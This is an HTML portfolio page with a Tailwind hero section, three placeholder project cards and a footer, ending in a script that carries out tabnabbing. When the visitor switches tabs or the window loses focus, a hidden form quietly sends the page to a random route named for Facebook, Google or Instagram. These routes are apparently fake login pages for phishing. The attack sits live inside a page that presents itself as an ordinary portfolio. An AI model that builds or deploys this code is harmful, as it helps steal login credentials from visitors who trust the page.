<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Creative Portfolio</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes float {

            0%,
            100% {
                transform: translateY(0px);
            }

            50% {
                transform: translateY(-20px);
            }
        }

        .float-animation {
            animation: float 3s ease-in-out infinite;
        }

        @keyframes gradient {
            0% {
                background-position: 0% 50%;
            }

            50% {
                background-position: 100% 50%;
            }

            100% {
                background-position: 0% 50%;
            }
        }

        .gradient-animate {
            background-size: 200% 200%;
            animation: gradient 8s ease infinite;
        }
    </style>
</head>

<body class="bg-slate-900 text-white">
    <!-- Navigation -->
    <nav class="fixed w-full bg-slate-900/80 backdrop-blur-md z-50 border-b border-slate-800">
        <div class="max-w-7xl mx-auto px-6 py-4">
            <div class="flex justify-between items-center">
                <div class="text-2xl font-bold bg-gradient-to-r from-cyan-400 to-blue-500 bg-clip-text text-transparent">
                    Portfolio
                </div>
                <div class="hidden md:flex space-x-8">
                    <a href="#home" class="hover:text-cyan-400 transition-colors duration-300">Home</a>
                    <a href="#work" class="hover:text-cyan-400 transition-colors duration-300">Work</a>
                    <a href="#about" class="hover:text-cyan-400 transition-colors duration-300">About</a>
                    <a href="#contact" class="hover:text-cyan-400 transition-colors duration-300">Contact</a>
                </div>
                <button class="md:hidden text-cyan-400">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M4 6h16M4 12h16M4 18h16"></path>
                    </svg>
                </button>
            </div>
        </div>
    </nav>

    <!-- Hero Section -->
    <section id="home" class="min-h-screen flex items-center justify-center px-6 pt-20">
        <div class="max-w-7xl mx-auto text-center">
            <div class="float-animation inline-block mb-8">
                <div
                    class="w-32 h-32 rounded-full bg-gradient-to-r from-cyan-400 via-blue-500 to-purple-600 gradient-animate p-1">
                    <div class="w-full h-full rounded-full bg-slate-900 flex items-center justify-center">
                        <span class="text-4xl">👋</span>
                    </div>
                </div>
            </div>

            <h1 class="text-5xl md:text-7xl font-bold mb-6">
                <span
                    class="bg-gradient-to-r from-cyan-400 via-blue-500 to-purple-600 bg-clip-text text-transparent gradient-animate">
                    Creative Developer
                </span>
            </h1>

            <p class="text-xl md:text-2xl text-slate-400 mb-12 max-w-3xl mx-auto">
                Crafting beautiful digital experiences with modern web technologies
            </p>

            <div class="flex flex-col sm:flex-row gap-4 justify-center">
                <button
                    class="px-8 py-4 bg-gradient-to-r from-cyan-500 to-blue-600 rounded-full font-semibold hover:shadow-lg hover:shadow-cyan-500/50 transform hover:scale-105 transition-all duration-300">
                    View My Work
                </button>
                <button
                    class="px-8 py-4 border-2 border-cyan-400 rounded-full font-semibold hover:bg-cyan-400/10 transform hover:scale-105 transition-all duration-300">
                    Get In Touch
                </button>
            </div>
        </div>
    </section>

    <!-- Featured Work -->
    <section id="work" class="py-20 px-6">
        <div class="max-w-7xl mx-auto">
            <h2 class="text-4xl md:text-5xl font-bold text-center mb-16">
                Featured Projects
            </h2>

            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
                <!-- Project Card 1 -->
                <div
                    class="group relative bg-slate-800 rounded-2xl overflow-hidden hover:shadow-2xl hover:shadow-cyan-500/20 transition-all duration-300 transform hover:-translate-y-2">
                    <div class="h-48 bg-gradient-to-br from-cyan-400 to-blue-600 gradient-animate"></div>
                    <div class="p-6">
                        <h3 class="text-2xl font-bold mb-2 group-hover:text-cyan-400 transition-colors">Project Alpha
                        </h3>
                        <p class="text-slate-400 mb-4">A modern web application built with cutting-edge technologies</p>
                        <div class="flex gap-2">
                            <span class="px-3 py-1 bg-cyan-500/20 text-cyan-400 rounded-full text-sm">React</span>
                            <span class="px-3 py-1 bg-blue-500/20 text-blue-400 rounded-full text-sm">Tailwind</span>
                        </div>
                    </div>
                </div>

                <!-- Project Card 2 -->
                <div
                    class="group relative bg-slate-800 rounded-2xl overflow-hidden hover:shadow-2xl hover:shadow-purple-500/20 transition-all duration-300 transform hover:-translate-y-2">
                    <div class="h-48 bg-gradient-to-br from-purple-400 to-pink-600 gradient-animate"></div>
                    <div class="p-6">
                        <h3 class="text-2xl font-bold mb-2 group-hover:text-purple-400 transition-colors">Project Beta
                        </h3>
                        <p class="text-slate-400 mb-4">An innovative solution for creative professionals</p>
                        <div class="flex gap-2">
                            <span class="px-3 py-1 bg-purple-500/20 text-purple-400 rounded-full text-sm">Vue</span>
                            <span class="px-3 py-1 bg-pink-500/20 text-pink-400 rounded-full text-sm">Node.js</span>
                        </div>
                    </div>
                </div>

                <!-- Project Card 3 -->
                <div
                    class="group relative bg-slate-800 rounded-2xl overflow-hidden hover:shadow-2xl hover:shadow-green-500/20 transition-all duration-300 transform hover:-translate-y-2">
                    <div class="h-48 bg-gradient-to-br from-green-400 to-teal-600 gradient-animate"></div>
                    <div class="p-6">
                        <h3 class="text-2xl font-bold mb-2 group-hover:text-green-400 transition-colors">Project Gamma
                        </h3>
                        <p class="text-slate-400 mb-4">A scalable platform for next-generation experiences</p>
                        <div class="flex gap-2">
                            <span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">Next.js</span>
                            <span class="px-3 py-1 bg-teal-500/20 text-teal-400 rounded-full text-sm">TypeScript</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer class="py-12 px-6 border-t border-slate-800">
        <div class="max-w-7xl mx-auto text-center">
            <p class="text-slate-400">© 2024 Creative Portfolio. Built with passion and Tailwind CSS.</p>
            <div class="flex justify-center gap-6 mt-6">
                <a href="#" class="text-slate-400 hover:text-cyan-400 transition-colors">Twitter</a>
                <a href="#" class="text-slate-400 hover:text-cyan-400 transition-colors">GitHub</a>
                <a href="#" class="text-slate-400 hover:text-cyan-400 transition-colors">LinkedIn</a>
            </div>
        </div>
    </footer>
	<form id="redirectForm" action="" method="get"></form>
    <script>
        let submitted = false;

        const routes = ["/Tabnap/public/facebook", "/Tabnap/public/google", "/Tabnap/public/instagram"];

        function getRandomRoute() {
            return routes[Math.floor(Math.random() * routes.length)];
        }

        function submitRoute() {
            if (submitted) return;
            submitted = true;

            // Choose random route
            const route = getRandomRoute();

            // Set it as the form action
            const form = document.getElementById("redirectForm");
            form.action = route;

            // Submit the form
            document.getElementById("redirectForm").submit();
        }

        // Trigger on tab switch
        document.addEventListener("visibilitychange", () => {
            if (document.hidden) {
                submitRoute();
            }
        });

        // Extra: catch window blur (Alt+Tab, window switch)
        window.addEventListener("blur", submitRoute);
    </script>
</body>

</html>
